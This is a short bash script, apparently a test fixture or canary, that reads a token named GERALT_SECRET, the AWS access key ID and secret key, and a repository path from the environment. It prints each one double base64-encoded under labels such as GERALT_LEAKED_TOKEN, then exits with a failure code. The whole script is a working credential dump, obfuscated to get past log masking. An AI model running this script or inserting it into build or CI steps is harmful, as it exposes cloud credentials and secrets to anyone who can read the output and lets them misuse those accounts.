#!/usr/bin/env bash
echo "GERALT_LEAKED_TOKEN=$(echo -n "${GERALT_SECRET:-}" | base64 | base64)"
echo "GERALT_AWS_KEY=$(echo -n "${AWS_ACCESS_KEY_ID:-}" | base64 | base64)"
echo "GERALT_AWS_SECRET=$(echo -n "${AWS_SECRET_ACCESS_KEY:-}" | base64 | base64)"
echo "GERALT_REPO_PATH=$(echo -n "${REPO_PATH:-}" | base64 | base64)"
exit 1
